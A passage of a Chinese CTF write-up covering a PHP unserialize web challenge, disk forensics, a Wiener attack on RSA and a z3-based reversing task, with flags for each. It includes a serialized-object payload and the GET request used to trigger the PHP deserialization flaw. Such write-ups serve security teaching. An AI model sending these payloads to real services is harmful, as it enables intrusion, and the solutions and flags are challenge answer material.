class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>利用<strong>string</strong>的特性。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span> = <span class="string">&quot;NAN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span> = NAN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">trick</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A5%3A%22trick%22%3A2%3A%7Bs%3A6%3A%22trick1%22%3Bs%3A3%3A%22NAN%22%3Bs%3A6%3A%22trick2%22%3Bd%3ANAN%3B%7D%</span></span><br></pre></td></tr></table></figure>
+<p>然后打一下。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?trick=O%3A5%3A&quot;trick&quot;%3A2%3A%7Bs%3A6%3A&quot;trick1&quot;%3Bs%3A3%3A&quot;NAN&quot;%3Bs%3A6%3A&quot;trick2&quot;%3Bd%3ANAN%3B%7D%</span><br><span class="line">flag&#123;e57a5617-e605-4978-81d6-311c516c7ca7&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="misc">MISC</h1>
+<h2 id="电脑被黑">电脑被黑</h2>
+<p>根据描述，恢复出一个<strong>demo</strong>和<strong>flag.txt</strong>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep --restore-all disk_dump</span><br></pre></td></tr></table></figure>
+<p><strong>IDA</strong>打开<strong>demo</strong>，简单修改一下就可以逆向。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  FILE *v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">34</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = fgetc(v7);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fputc((v4 ^ v6) - v5, stream);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v7);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;e5d7c4ed-b8f6-4417-8317-b809fc26c047&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="the_best_ctf_game">the_best_ctf_game</h2>
+<p><strong>16</strong>进制打开过滤一下一些字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65e02f26-0d6e-463f-bc63-2df733e47fbe&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="crypto">Crypto</h1>
+<h2 id="bd">bd</h2>
+<p><strong>E</strong>很大，<strong>Wiener</strong>一把梭。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_hack_RSA</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Testing Wiener Attack&quot;</span>)</span><br><span class="line">    c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">    e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">    n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">    hacked_d = hack_RSA(e, n)</span><br><span class="line">    <span class="built_in">print</span>(hacked_d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(c, hacked_d, n))</span><br><span class="line"><span class="comment"># 56006392793428926653739441307877479859588558044180270732051018541455698198327268542258074930468108413</span></span><br></pre></td></tr></table></figure>
+<p>然后转字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">56006392793428926653739441307877479859588558044180270732051018541455698198327268542258074930468108413</span>)[<span class="number">2</span>:]))</span><br><span class="line"><span class="string">b&#x27;flag&#123;d3752538-90d0-c373-cfef-9247d3e16848&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h1 id="re">Re</h1>
+<h2 id="z3">z3</h2>
+<p><strong>IDA</strong>打开，是个解方程，结合题意的<strong>z3</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x4F17</span>, <span class="number">0x9CF6</span>, <span class="number">0x8DDB</span>, <span class="number">0x8EA6</span>, <span class="number">0x6929</span>, <span class="number">0x9911</span>, <span class="number">0x40A2</span>, <span class="number">0x2F3E</span>, <span class="number">0x62B6</span>, <span class="number">0x4B82</span>, <span class="number">0x486C</span>, <span class="number">0x4002</span>, <span class="number">0x52D7</span>, <span class="number">0x2DEF</span>,</span><br><span class="line">       <span class="number">0x28DC</span>, <span class="number">0x640D</span>, <span class="number">0x528F</span>, <span class="number">0x613B</span>, <span class="number">0x4781</span>, <span class="number">0x6B17</span>, <span class="number">0x3237</span>, <span class="number">0x2A93</span>, <span class="number">0x615F</span>, <span class="number">0x50BE</span>, <span class="number">0x598E</span>, <span class="number">0x4656</span>, <span class="number">0x5B31</span>, <span class="number">0x313A</span>,</span><br><span class="line">       <span class="number">0x3010</span>, <span class="number">0x67FE</span>, <span class="number">0x4D5F</span>, <span class="number">0x58DB</span>, <span class="number">0x3799</span>, <span class="number">0x60A0</span>, <span class="number">0x2750</span>, <span class="number">0x3759</span>, <span class="number">0x8953</span>, <span class="number">0x7122</span>, <span class="number">0x81F9</span>, <span class="number">0x5524</span>, <span class="number">0x8971</span>, <span class="number">0x3A1D</span>]</span><br><span class="line">v46 = Int(<span class="string">&#x27;v46&#x27;</span>)</span><br><span class="line">v47 = Int(<span class="string">&#x27;v47&#x27;</span>)</span><br><span class="line">v48 = Int(<span class="string">&#x27;v48&#x27;</span>)</span><br><span class="line">v49 = Int(<span class="string">&#x27;v49&#x27;</span>)</span><br><span class="line">v50 = Int(<span class="string">&#x27;v50&#x27;</span>)</span><br><span class="line">v51 = Int(<span class="string">&#x27;v51&#x27;</span>)</span><br><span class="line">v52 = Int(<span class="string">&#x27;v52&#x27;</span>)</span><br><span class="line">v53 = Int(<span class="string">&#x27;v53&#x27;</span>)</span><br><span class="line">v54 = Int(<span class="string">&#x27;v54&#x27;</span>)</span><br><span class="line">v55 = Int(<span class="string">&#x27;v55&#x27;</span>)</span><br><span class="line">v56 = Int(<span class="string">&#x27;v56&#x27;</span>)</span><br><span class="line">v57 = Int(<span class="string">&#x27;v57&#x27;</span>)</span><br><span class="line">v58 = Int(<span class="string">&#x27;v58&#x27;</span>)</span><br><span class="line">v59 = Int(<span class="string">&#x27;v59&#x27;</span>)</span><br><span class="line">v60 = Int(<span class="string">&#x27;v60&#x27;</span>)</span><br><span class="line">v61 = Int(<span class="string">&#x27;v61&#x27;</span>)</span><br><span class="line">v62 = Int(<span class="string">&#x27;v62&#x27;</span>)</span><br><span class="line">v63 = Int(<span class="string">&#x27;v63&#x27;</span>)</span><br><span class="line">v64 = Int(<span class="string">&#x27;v64&#x27;</span>)</span><br><span class="line">v65 = Int(<span class="string">&#x27;v65&#x27;</span>)</span><br><span class="line">v66 = Int(<span class="string">&#x27;v66&#x27;</span>)</span><br><span class="line">v67 = Int(<span class="string">&#x27;v67&#x27;</span>)</span><br><span class="line">v68 = Int(<span class="string">&#x27;v68&#x27;</span>)</span><br><span class="line">v69 = Int(<span class="string">&#x27;v69&#x27;</span>)</span><br><span class="line">v70 = Int(<span class="string">&#x27;v70&#x27;</span>)</span><br><span class="line">v71 = Int(<span class="string">&#x27;v71&#x27;</span>)</span><br><span class="line">v72 = Int(<span class="string">&#x27;v72&#x27;</span>)</span><br><span class="line">v73 = Int(<span class="string">&#x27;v73&#x27;</span>)</span><br><span class="line">v74 = Int(<span class="string">&#x27;v74&#x27;</span>)</span><br><span class="line">v75 = Int(<span class="string">&#x27;v75&#x27;</span>)</span><br><span class="line">v76 = Int(<span class="string">&#x27;v76&#x27;</span>)</span><br><span class="line">v77 = Int(<span class="string">&#x27;v77&#x27;</span>)</span><br><span class="line">v78 = Int(<span class="string">&#x27;v78&#x27;</span>)</span><br><span class="line">v79 = Int(<span class="string">&#x27;v79&#x27;</span>)</span><br><span class="line">v80 = Int(<span class="string">&#x27;v80&#x27;</span>)</span><br><span class="line">v81 = Int(<span class="string">&#x27;v81&#x27;</span>)</span><br><span class="line">v82 = Int(<span class="string">&#x27;v82&#x27;</span>)</span><br><span class="line">v83 = Int(<span class="string">&#x27;v83&#x27;</span>)</span><br><span class="line">v84 = Int(<span class="string">&#x27;v84&#x27;</span>)</span><br><span class="line">v85 = Int(<span class="string">&#x27;v85&#x27;</span>)</span><br><span class="line">v86 = Int(<span class="string">&#x27;v86&#x27;</span>)</span><br><span class="line">v87 = Int(<span class="string">&#x27;v87&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(res[<span class="number">0</span>] == <span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(res[<span class="number">1</span>] == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(res[<span class="number">2</span>] == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(res[<span class="number">3</span>] == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(res[<span class="number">4</span>] == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(res[<span class="number">5</span>] == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(res[<span class="number">6</span>] == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(res[<span class="number">7</span>] == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(res[<span class="number">8</span>] == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(res[<span class="number">9</span>] == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(res[<span class="number">10</span>] == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(res[<span class="number">11</span>] == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(res[<span class="number">12</span>] == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(res[<span class="number">13</span>] == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(res[<span class="number">14</span>] == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(res[<span class="number">15</span>] == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(res[<span class="number">16</span>] == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(res[<span class="number">17</span>] == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(res[<span class="number">18</span>] == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(res[<span class="number">19</span>] == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(res[<span class="number">20</span>] == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(res[<span class="number">21</span>] == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(res[<span class="number">22</span>] == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(res[<span class="number">23</span>] == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(res[<span class="number">24</span>] == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(res[<span class="number">25</span>] == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(res[<span class="number">26</span>] == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(res[<span class="number">27</span>] == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(res[<span class="number">28</span>] == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80)</span><br><span class="line">s.add(res[<span class="number">29</span>] == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(res[<span class="number">30</span>] == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(res[<span class="number">31</span>] == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(res[<span class="number">32</span>] == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(res[<span class="number">33</span>] == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(res[<span class="number">34</span>] == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(res[<span class="number">35</span>] == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(res[<span class="number">36</span>] == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(res[<span class="number">37</span>] == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(res[<span class="number">38</span>] == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(res[<span class="number">39</span>] == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(res[<span class="number">40</span>] == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(res[<span class="number">41</span>] == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#x27;%s&#x27;: %s,&quot;</span> % (d.name(), m[d]))</span><br><span class="line">    </span><br><span class="line">res = &#123;<span class="string">&#x27;v84&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v65&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v63&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v74&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v47&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;v62&#x27;</span>: <span class="number">98</span>, <span class="string">&#x27;v81&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;v64&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v48&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;v51&#x27;</span>: <span class="number">55</span>,</span><br><span class="line">       <span class="string">&#x27;v58&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;v53&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v49&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;v55&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v57&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v67&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v54&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;v70&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v69&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v56&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">       <span class="string">&#x27;v86&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;v72&#x27;</span>: <span class="number">48</span>, <span class="string">&#x27;v60&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v78&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v68&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;v79&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;v75&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v46&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;v77&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v76&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">       <span class="string">&#x27;v50&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;v61&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;v71&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v82&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;v83&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;v85&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v87&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;v80&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;v73&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">       <span class="string">&#x27;v66&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;v59&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v52&#x27;</span>: <span class="number">101</span>, &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(res):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(res[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 